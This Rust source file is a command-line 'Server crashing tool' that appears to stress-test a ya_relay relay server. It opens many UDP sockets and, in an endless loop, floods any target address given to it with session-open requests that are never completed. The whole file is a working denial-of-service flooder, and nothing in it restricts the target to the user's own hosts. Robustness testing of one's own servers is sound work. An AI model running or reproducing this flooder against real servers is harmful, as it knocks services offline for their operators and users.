use std::io;
use std::net::SocketAddr;
use clap::{Command, Parser, Subcommand};
use tokio::net::UdpSocket;
use tokio::task::JoinHandle;
use ya_relay_proto::proto::{Message, Packet, packet, request, Request};


#[derive(Parser)]
#[command(author, version, about = "Server crashing tool")]
struct Args {
    /// Server that we want to crash.
    target : SocketAddr,
    /// how many different sockets to use.
    #[arg(short, default_value = "16")]
    concurrent : usize,
    #[command(subcommand)]
    command : GremlinCmd
}

#[derive(Subcommand, Clone)]
enum GremlinCmd {
    /// Sends session open without continuation.
    FloodSessionOpen {}
}

#[actix_rt::main]
async fn main() -> anyhow::Result<()> {

    let args = Args::parse();
    let local = tokio::task::LocalSet::new();

    for _ in 0..args.concurrent {
        let socket = UdpSocket::bind("0.0.0.0:0").await?;
        let cmd = &args.command;
        let _ : JoinHandle<io::Result<()>> = local.spawn_local(async move {
            match cmd {
                GremlinCmd::FloodSessionOpen {} => {
                    let mut request_id = 1;
                    loop {
                        request_id += 1;
                        let packet = Packet {
                            session_id: Default::default(),
                            kind: Some(packet::Kind::Request(Request {
                                request_id,
                                kind: Some(request::Kind::Session(Default::default()))
                            }))
                        };
                        socket.send_to(&packet.encode_to_vec(), args.target).await?;
                    }
                }
            }
            Ok(())
        });
    }

    local.await;
    Ok(())
}